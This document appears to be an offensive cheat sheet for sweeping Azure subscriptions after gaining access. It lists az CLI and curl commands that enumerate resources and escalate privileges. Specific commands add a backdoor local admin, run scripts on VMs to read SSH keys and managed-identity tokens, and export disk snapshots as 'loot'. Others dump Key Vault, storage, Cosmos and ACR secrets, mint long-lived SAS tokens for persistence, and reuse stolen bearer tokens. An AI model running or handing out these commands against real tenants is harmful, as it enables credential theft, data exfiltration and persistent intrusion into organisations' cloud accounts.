# Azure ARM Sweep — Full Command Reference

Everything below assumes a logged-in `az` context (or a raw bearer token, §9).
Run per subscription: `az account set --subscription <subId>` first, or pass
`--subscription <subId>` on each command. Add `-o json` everywhere for parsing.

## 1. Identity, tenants, subscriptions

```bash
az account show -o json
az account list --all --refresh -o json          # refresh forces re-query of ARM
az account tenant list -o json
az ad signed-in-user show -o json                # Graph; only for user logins
az account get-access-token --resource https://management.azure.com/ -o json
az account get-access-token --resource https://graph.microsoft.com/ -o json
az account get-access-token --resource https://vault.azure.net -o json
az account get-access-token --resource https://storage.azure.com/ -o json
az account get-access-token --resource https://database.windows.net/ -o json   # SQL AAD auth
```

Decode any token: `cut -d. -f2 | base64 -d` (pad with `=`). Fields that matter:
`oid` (principal object id), `appid`, `idtyp` (`user`/`app`), `xms_mirid`
(resource id of the managed identity — tells you which VM/App you're running as),
`wids` (directory role template ids).

## 2. RBAC

```bash
az role assignment list --all -o json                       # whole subscription incl. child scopes
az role assignment list --assignee <oid-or-upn> --all -o json
az role assignment list --include-inherited --include-groups -o json
az role assignment list --scope /providers/Microsoft.Management/managementGroups/<mgId> -o json
az role definition list -o json
az role definition list --custom-role-only true -o json
az role definition list -n "Virtual Machine Contributor" -o json   # inspect actions
```

Privesc-relevant actions to grep in role definitions:
`Microsoft.Authorization/roleAssignments/write`, `*/write`, `*`,
`Microsoft.Compute/virtualMachines/runCommand/action` (and `runCommands/write`),
`Microsoft.KeyVault/vaults/*`, `Microsoft.Storage/storageAccounts/listKeys/action`,
`Microsoft.Web/sites/config/list/action`,
`Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`,
`Microsoft.Automation/automationAccounts/*`,
`Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action`.

## 3. Compute

```bash
az vm list -d -o json                 # -d adds powerState + public/private IPs
az vm list-ip-addresses -o json
az vm show -g RG -n VM -o json        # .identity = attached managed identities
az vm user update -g RG -n VM -u pwned -p 'P@ssw0rd123!'   # VMAccess extension = new admin
az vm run-command invoke -g RG -n VM --command-id RunShellScript \
  --scripts 'id; cat /root/.ssh/id_rsa; env; curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"'
az vm run-command invoke -g RG -n VM --command-id RunPowerShellScript \
  --scripts 'whoami; Get-ChildItem C:\Users -Recurse -Include *.config,*.ps1 -EA 0'
az vm extension list -g RG --vm-name VM -o json       # CustomScript extensions carry commands/creds
az disk list -o json                                   # snapshot + SAS export of disks:
az snapshot create -g RG -n loot --source <diskId>
az snapshot grant-access -g RG -n loot --duration-in-seconds 86400 --access-level Read   # returns SAS URL -> download VHD
az vmss list -o json
az vmss run-command invoke -g RG -n VMSS --instance-id 0 --command-id RunShellScript --scripts 'id'
az sshkey list -o json
az image list -o json; az sig list -o json             # golden images often embed creds
```

Run-command executes as root (Linux) / SYSTEM (Windows). The two best payloads:
dump IMDS identity tokens (becomes the VM's managed identity) and read local
secrets/SSH keys. `az vm user update` adds a local admin without touching the OS
auth stack — quieter persistence.

## 4. Storage

```bash
az storage account list -o json       # check .allowBlobPublicAccess, .networkRuleSet, .minimumTlsVersion
az storage account keys list -n ACCT -g RG -o json          # 2 full-control keys
az storage account show-connection-string -n ACCT -g RG -o json
az storage container list --account-name ACCT --account-key KEY -o json
az storage container list --account-name ACCT --auth-mode login -o json   # AAD data-plane if keys denied
az storage blob list -c CONTAINER --account-name ACCT --account-key KEY -o json
az storage blob download -c CONTAINER -n path/blob --account-name ACCT --account-key KEY -f loot.bin
az storage account generate-sas --account-name ACCT --account-key KEY \
  --services b --resource-types sco --permissions rl --expiry 2030-01-01   # durable offline access
az storage share list --account-name ACCT --account-key KEY -o json        # Azure Files
az storage table list --account-name ACCT --account-key KEY -o json
az storage queue list --account-name ACCT --account-key KEY -o json
```

What leaks: tfstate, VM diagnostics, `.publishsettings`, backups, flow logs,
`cloud-init` payloads. Public-container check and mass blob triage ->
`cloud-storage-exposure`.

## 5. Key Vault

```bash
az keyvault list -o json              # .properties.enableRbacAuthorization decides access model
az keyvault show -n KV -o json        # access policies list who can read secrets
az keyvault secret list --vault-name KV -o json
az keyvault secret show --vault-name KV -n NAME -o json       # .value = plaintext
az keyvault key list --vault-name KV -o json
az keyvault certificate list --vault-name KV -o json
az keyvault secret list-deleted --vault-name KV -o json       # soft-deleted secrets recoverable
az keyvault secret recover --vault-name KV -n NAME
```

Always attempt `secret list` on every vault even if `show` on the vault fails —
management-plane and data-plane permissions are separate. If RBAC-mode and you
hold `Key Vault Administrator`/`Secrets User` anywhere, that wins. If access-policy
mode and you can write policies (`Microsoft.KeyVault/vaults/write` via Contributor),
grant yourself: `az keyvault set-policy -n KV --secret-permissions get list --upn you@example.com`.

## 6. App Service / Functions

```bash
az webapp list -o json                                 # .defaultHostName = public endpoint
az webapp config appsettings list -g RG -n APP -o json         # env vars = secrets
az webapp config connection-string list -g RG -n APP -o json
az webapp deployment list-publishing-profiles -g RG -n APP -o json   # SCM/FTP creds -> kudu shell
az webapp deployment source show -g RG -n APP -o json  # repo URL, sometimes PAT in URL
az webapp ssh -g RG -n APP                             # interactive shell on Linux apps
az functionapp list -o json
az functionapp config appsettings list -g RG -n FN -o json
az functionapp keys list -g RG -n FN -o json           # master/host keys = invoke any function
az functionapp function keys list -g RG -n FN --function-name F -o json
az rest --method post --url "https://management.azure.com/<siteResourceId>/host/default/listkeys?api-version=2022-03-01"
```

Publishing profile creds work against `https://<app>.scm.azurewebsites.net` —
kudu gives a web shell (`/api/command`) and file download (`/api/vfs/`), and the
app's IMDS/MSI endpoint (`$IDENTITY_ENDPOINT` + `$IDENTITY_HEADER`) yields the
app's managed-identity token.

## 7. Databases, AKS, containers

```bash
az sql server list -o json                     # .administratorLogin, .fullyQualifiedDomainName
az sql server ad-admin list -g RG -s SRV -o json
az sql db list -g RG -s SRV -o json
az sql server firewall-rule list -g RG -s SRV -o json    # 0.0.0.0 rule = open to Azure
az postgres flexible-server list -o json; az mysql flexible-server list -o json
az cosmosdb list -o json
az cosmosdb keys list -n DB -g RG -o json                 # primaryMasterKey = full data access
az cosmosdb keys list -n DB -g RG --type connection-strings -o json
az aks list -o json                            # .identity, .nodeResourceGroup
az aks get-credentials -g RG -n CLUSTER --admin -f kubeconfig-cluster   # admin bypasses AAD RBAC
az rest --method post --url "https://management.azure.com/<aksId>/listClusterAdminCredential?api-version=2024-05-01"
az acr list -o json
az acr credential show -n REG -o json          # admin user/pass if adminUserEnabled
az acr repository list -n REG -o json
az acr repository show-tags -n REG --repository app -o json
az acr login -n REG && docker pull REG.azurecr.io/app:latest   # grep layers for secrets
az containerapp list -o json; az container list -o json         # ACI env vars in .containers[].environmentVariables
```

## 8. Automation, networking, misc

```bash
az automation account list -o json
az automation runbook list --automation-account-name AA -g RG -o json
az rest --method get --url "https://management.azure.com/<runbookId>/content?api-version=2023-11-01"   # runbook source
az rest --method get --url "https://management.azure.com/<aaId>/variables?api-version=2023-11-01"      # vars; encrypted ones readable from inside a runbook
# Contributor on AA = create a runbook that runs as the AA's identity -> privesc:
#   az automation runbook create/replace-content/publish/start

az network public-ip list -o json              # the external attack surface list
az network nsg list -o json                    # grep rules for 0.0.0.0/0 or Internet source
az network nsg rule list -g RG --nsg-name NSG -o json
az network lb list -o json; az network application-gateway list -o json
az network vnet list -o json; az network vnet peering list -g RG --vnet-name V -o json
az network bastion list -o json
az network private-endpoint list -o json
az deployment group list -g RG -o json         # deployment history:
az deployment group show -g RG -n DEP --query properties.parameters   # params often hold passwords
az rest --method get --url "https://management.azure.com/subscriptions/<s>/resourcegroups/RG/providers/Microsoft.Resources/deployments/?api-version=2021-04-01"
az monitor diagnostic-settings list --resource <id> -o json
az logic workflow list -o json                 # Logic Apps definitions embed connection secrets
az servicebus namespace list -o json
az servicebus namespace authorization-rule keys list -g RG --namespace-name NS -n RootManageSharedAccessKey -o json
az eventhubs namespace list -o json
az signalr list -o json; az signalr key list -n SR -g RG -o json
```

ARM deployment history is a classic secret leak: anything passed as a
non-`securestring` parameter is stored forever in the deployment object.

## 9. Raw ARM REST (token-only operation)

With only a bearer token (stolen from IMDS, phishing, or a CI log):

```bash
TOKEN=eyJ0...
H="Authorization: Bearer $TOKEN"
curl -s -H "$H" "https://management.azure.com/tenants?api-version=2021-04-01"
curl -s -H "$H" "https://management.azure.com/subscriptions?api-version=2021-04-01"
curl -s -H "$H" "https://management.azure.com/subscriptions/<s>/resources?api-version=2021-04-01&%24expand=createdTime,changedTime"
curl -s -H "$H" "https://management.azure.com/subscriptions/<s>/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"
# universal secret pattern — POST list* with empty body:
curl -s -X POST -H "$H" -H "Content-Length: 0" \
  "https://management.azure.com/<storageAccountId>/listKeys?api-version=2023-01-01"
curl -s -X POST -H "$H" -H "Content-Length: 0" \
  "https://management.azure.com/<cosmosId>/listKeys?api-version=2024-05-15"
# what can I do on a resource:
curl -s -H "$H" "https://management.azure.com/<resourceId>/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
```

Pagination: follow `nextLink` in every list response. The `permissions` call is
the ARM equivalent of GCP `testIamPermissions` — returns effective
`actions`/`notActions` for the caller at that scope.

Resource Graph (one query, all subs):

```bash
az extension add -n resource-graph
az graph query -q "Resources | where type =~ 'microsoft.network/publicipaddresses' | project name, properties.ipAddress, subscriptionId" --first 1000 -o json
az graph query -q "Resources | where properties.allowBlobPublicAccess == true | project id" -o json
```

## 10. What leaks where (triage priorities)

| Found | Means |
|---|---|
| Storage keys / connection strings | full data-plane control; mint SAS for persistence |
| Key Vault secret values | lateral creds: DB passwords, SP secrets, API keys |
| App settings / connection strings | same, plus `AzureWebJobsStorage` -> storage account takeover |
| Publishing profiles | kudu shell + app's MSI token |
| Run-command on any VM | code exec + IMDS token theft -> become VM identity |
| Deployment history parameters | historical plaintext passwords |
| Automation variables/runbooks | creds + run-as identity execution |
| Cosmos/SQL/ServiceBus keys | data exfil + often further embedded creds |
| ACR admin creds | pull all images; push backdoored image if CD pulls `:latest` |
| NSG 0.0.0.0/0 + public IP | direct network attack surface for the net-pentest flow |
